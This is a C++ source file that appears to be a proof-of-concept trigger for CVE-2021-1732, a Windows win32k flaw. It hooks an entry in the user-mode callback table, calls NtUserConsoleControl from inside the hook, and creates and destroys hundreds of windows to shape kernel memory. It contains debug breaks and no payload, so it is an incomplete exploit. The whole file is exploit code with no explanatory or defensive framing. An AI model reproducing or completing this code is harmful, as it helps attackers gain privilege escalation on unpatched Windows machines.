// CVE-2021-1732.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <HookLib.h>

#pragma comment(lib, "Zydis.lib")
#pragma comment(lib, "HookLib.lib")

#define CLS_NAME L"PO_WND_CLS"
#define WND_NAME L"PO_WND"

#define CALLBACK_INDEX		0x7B

using USERMODECALLBACK = VOID(WINAPI*)( ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4 );
USERMODECALLBACK UserModeCallback_Orig = NULL;

using NTUSERCONSOLECONTROL = NTSTATUS(WINAPI*)(ULONG_PTR CtrlCode, PVOID CtrlInfo, ULONG_PTR CtrlInfoLen);
NTUSERCONSOLECONTROL NtUserConsoleControl = NULL;


VOID WINAPI UserModeCallback_Proxy(ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4)
{
	ULONG_PTR ulInfo[0x2] = { 0 };
	printf("UserMode Callback: %llx %llx %llx %llx\n", Para1, Para2, Para3, Para4 );
	//__debugbreak();

	NtUserConsoleControl(0x6, (PVOID)&ulInfo, sizeof(ulInfo));
	UserModeCallback_Orig(Para1, Para2, Para3, Para4);
}

BOOL RegistWndClass( PCTSTR ClsName ) {
	WNDCLASS wc = { 0 };

	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpszClassName = ClsName;
	
	return !!RegisterClass(&wc);
}

HWND CreateWnd() {
	return CreateWindowEx(NULL, CLS_NAME, WND_NAME, NULL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, GetModuleHandle(NULL), NULL);
}

int main()
{
	HMODULE hWin32uMod = LoadLibrary(TEXT("win32u.dll"));
	ULONG_PTR ulPebAddr = __readgsqword(0x60);
	PULONG_PTR pUserModeCallbackTable = *(PULONG_PTR*)(ulPebAddr + 0x58);

	__debugbreak();

	SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast<PVOID*>(&UserModeCallback_Orig));

	NtUserConsoleControl = (NTUSERCONSOLECONTROL)GetProcAddress(hWin32uMod, "NtUserConsoleControl");

	if (RegistWndClass(CLS_NAME)) {
		HWND hWnd[0x200];
		for (int i = 0; i < 0x200; i++) {
			hWnd[i] = CreateWnd();
		}
		printf("hwnd_0x100 is %X\n", hWnd[0x100]);
		DestroyWindow(hWnd[0x100]);
		HWND hWnd_0x100 = CreateWnd();
		printf("hwnd_0x100 is %X\n", hWnd_0x100);
	}
}